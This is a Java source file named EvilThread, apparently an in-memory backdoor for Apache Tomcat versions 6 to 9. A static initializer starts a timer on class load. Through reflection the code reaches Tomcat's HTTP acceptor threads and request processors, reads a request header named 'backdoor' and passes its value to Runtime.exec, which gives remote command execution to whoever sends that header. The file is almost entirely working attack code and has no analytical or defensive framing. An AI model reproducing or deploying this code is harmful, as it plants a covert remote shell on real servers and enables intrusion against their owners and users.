import org.apache.catalina.util.ServerInfo;

import java.lang.reflect.Field;
import java.util.List;

public class EvilThread {
    static {
        System.out.println("Begin inject!-------");
        new java.util.Timer().schedule(new java.util.TimerTask(){
            public void run(){
                backdoor();
            }
        },0,1000);
        System.out.println("Success!");
    }
    public static  Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                // field不存在，错误不抛出，测试时可以抛出
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }
     public static  void backdoor(){
        //tomcat 678
         String versionStr = ServerInfo.getServerNumber();
         boolean isTomcat678 = versionStr.startsWith("6") || versionStr.startsWith("7") || versionStr.startsWith("8");
         boolean isTomcat9 = versionStr.startsWith("9");
         if(!(isTomcat9||isTomcat678)){
             return;
         }
         Thread[] threads;
         try {
             ThreadGroup group = Thread.currentThread().getThreadGroup();
             ThreadGroup topGroup = group;
             while (group != null){
                 topGroup = group;
                 group = group.getParent();
             }
             int estimatedSize = topGroup.activeCount() * 2;
             threads = new Thread[estimatedSize];
             topGroup.enumerate(threads);
         }catch (Exception e){
             e.printStackTrace();
             return;
         }
         for (Thread thread : threads) {
             if(thread == null){
                 continue;
             }
             if (thread.getName().contains("exec")) {
                 continue;
             }
             if((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))){
                 System.out.println(1);
                 try{
                     Object target = getField(thread,"target");
                     Object jioEndPoint = null;
                     if(isTomcat678){
                         jioEndPoint = getField(target,"this$0");
                     }
                     if(isTomcat9){
                         jioEndPoint = getField(target,"endpoint");
                     }
                     if(jioEndPoint == null){
                         throw new NoSuchFieldException("jioendpoint not fount");
                     }
                     Object handler = getField(jioEndPoint,"handler");
                     System.out.println(1);
                     java.util.ArrayList processors = (java.util.ArrayList)getField(getField(handler,"global"),"processors");
                     System.out.println("processors!");
                     for (Object processor :processors) {
                         target = getField(processor, "req");
                         Object serverPort = getField(target, "serverPort");
                         String backdoorvalue = (String)target.getClass().getMethod("getHeader", String.class).invoke(target, "backdoor");
                         if(backdoorvalue != null && !backdoorvalue.isEmpty()){
                             System.out.println(backdoorvalue);
                             try{
                                 Runtime.getRuntime().exec(backdoorvalue);
                             }catch (Exception e){
                                 e.printStackTrace();
                             }
                         }
                     }
                 }catch (Exception e){
                     e.printStackTrace();
                 }
             }
         }
     }

    public static void main(String[] args) {
        System.out.println(1);
    }

}
